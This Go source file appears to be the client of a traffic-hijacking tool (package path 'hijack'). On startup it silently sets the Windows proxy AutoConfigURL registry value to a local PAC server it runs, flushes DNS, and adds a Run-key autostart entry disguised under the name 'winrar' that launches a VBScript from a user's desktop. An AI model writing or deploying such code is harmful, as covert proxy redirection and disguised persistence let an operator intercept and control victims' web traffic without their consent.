package main

import (
	"flag"
	"log"
	"os/exec"
	"zx/hijack/client/util"
)




func main() {
	go util.StartTcpServer(util.Config.JumpPort)
	util.SyncStartWebServer()
}

/**
	 初始化
 */
func init() {
	readExternalParam()
	log.Println("准备启动，当前参数:",util.Config)
	autoProxy()
	autoStart()
}

/*读取外部参数*/
func readExternalParam()  {
	// 代理端口
	var jPort string
	flag.StringVar(&jPort, "jport", util.Config.JumpPort, "代理服务器端口")

	// web端口
	var webPort string
	flag.StringVar(&webPort, "wport", util.Config.WebPort, "web服务器端口")

	//pacUrl
	var pacUrl string
	flag.StringVar(&pacUrl, "pac", util.Config.PacUrl, "pac获取url")
	flag.Parse()


	util.Config.JumpPort = jPort
	util.Config.WebPort = webPort
	util.Config.PacUrl = pacUrl
}

/**
	自动代理
 */
func autoProxy(){
	cmd := exec.Command("reg","add","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
		"/v","AutoConfigURL", "/t","REG_SZ", "/d","http://127.0.0.1:"+ util.Config.WebPort +"/pac", "/f")
	cmd.Run()
	cmd2 := exec.Command("ipconfig","/flushdns")
	cmd2.Run()
}

/**
	开启自启动
 */
 func autoStart() {
	 cmd := exec.Command("reg","add","HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		 "/v","winrar", "/t","REG_SZ", "/d","C:\\Users\\97038\\Desktop\\client.vbs", "/f")
	 cmd.Run()
 }



